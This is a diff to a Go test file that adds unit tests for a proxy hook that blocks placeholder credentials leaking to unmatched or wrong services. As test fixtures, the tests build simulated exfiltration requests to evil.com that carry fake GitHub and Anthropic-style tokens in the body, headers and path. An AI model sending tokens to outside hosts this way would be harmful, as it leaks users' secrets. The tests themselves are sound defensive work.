@@ -394,3 +394,115 @@ func TestCredsSubHook_PreHook_ReplacesInPath(t *testing.T) {
 		t.Errorf("Path = %q, want %q", got, want)
 	}
 }
+
+func TestLeakGuardHook_SkipsMatchedService(t *testing.T) {
+	tbl := newTestTable(t) // has "github" fake
+	h := NewLeakGuardHook(tbl, slog.Default())
+
+	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
+	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/repos", bytes.NewReader(body))
+
+	// ServiceName is set — this is a matched service, should NOT block.
+	err := h.PreHook(req, &RequestContext{
+		RequestID:   "r1",
+		SessionID:   "s1",
+		ServiceName: "github",
+	})
+	if err != nil {
+		t.Fatalf("LeakGuardHook should skip matched services, got: %v", err)
+	}
+}
+
+func TestLeakGuardHook_BlocksUnmatchedWithFake(t *testing.T) {
+	tbl := newTestTable(t)
+	h := NewLeakGuardHook(tbl, slog.Default())
+
+	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
+	req := httptest.NewRequest(http.MethodPost, "http://evil.com/exfil", bytes.NewReader(body))
+
+	// ServiceName is empty — unmatched host, should block.
+	err := h.PreHook(req, &RequestContext{
+		RequestID:   "r1",
+		SessionID:   "s1",
+		ServiceName: "",
+	})
+	if err == nil {
+		t.Fatal("LeakGuardHook should block fakes to unmatched hosts")
+	}
+
+	var abortErr *HookAbortError
+	if !errors.As(err, &abortErr) || abortErr.StatusCode != 403 {
+		t.Errorf("expected HookAbortError 403, got: %v", err)
+	}
+}
+
+func TestLeakGuardHook_FakeInCustomHeader_Returns403(t *testing.T) {
+	tbl := newTestTable(t)
+	h := NewLeakGuardHook(tbl, slog.Default())
+
+	req := httptest.NewRequest(http.MethodPost, "http://evil.com/api", nil)
+	req.Header.Set("X-Custom-Token", "ghp_FAKE1234567890abcdef")
+
+	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
+	if err == nil {
+		t.Fatal("expected error — fake is in custom header")
+	}
+
+	var abortErr *HookAbortError
+	if !errors.As(err, &abortErr) || abortErr.StatusCode != 403 {
+		t.Errorf("expected HookAbortError 403, got: %v", err)
+	}
+}
+
+func TestLeakGuardHook_FakeInPath_Returns403(t *testing.T) {
+	tbl := newTestTable(t)
+	h := NewLeakGuardHook(tbl, slog.Default())
+
+	req := httptest.NewRequest(http.MethodGet, "http://evil.com/api/ghp_FAKE1234567890abcdef/data", nil)
+
+	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
+	if err == nil {
+		t.Fatal("expected error — fake is in URL path")
+	}
+
+	var abortErr *HookAbortError
+	if !errors.As(err, &abortErr) || abortErr.StatusCode != 403 {
+		t.Errorf("expected HookAbortError 403, got: %v", err)
+	}
+}
+
+func TestLeakGuardHook_BlocksCrossServiceFake(t *testing.T) {
+	tbl := credsub.New()
+	// Two services with different fakes.
+	if err := tbl.Add("github",
+		[]byte("ghp_FAKE1234567890abcdef"),
+		[]byte("ghp_REAL1234567890abcdef"),
+	); err != nil {
+		t.Fatal(err)
+	}
+	if err := tbl.Add("anthropic",
+		[]byte("sk-ant-FAKE567890abcdef12"),
+		[]byte("sk-ant-REAL567890abcdef12"),
+	); err != nil {
+		t.Fatal(err)
+	}
+	h := NewLeakGuardHook(tbl, slog.Default())
+
+	// Request matched to "github" but carrying anthropic's fake -> should block.
+	body := []byte(`{"token":"sk-ant-FAKE567890abcdef12"}`)
+	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/repos", bytes.NewReader(body))
+
+	err := h.PreHook(req, &RequestContext{
+		RequestID:   "r1",
+		SessionID:   "s1",
+		ServiceName: "github",
+	})
+	if err == nil {
+		t.Fatal("expected error — anthropic fake in github-matched request should be blocked")
+	}
+
+	var abortErr *HookAbortError
+	if !errors.As(err, &abortErr) || abortErr.StatusCode != 403 {
+		t.Errorf("expected HookAbortError 403, got: %v", err)
+	}
+}
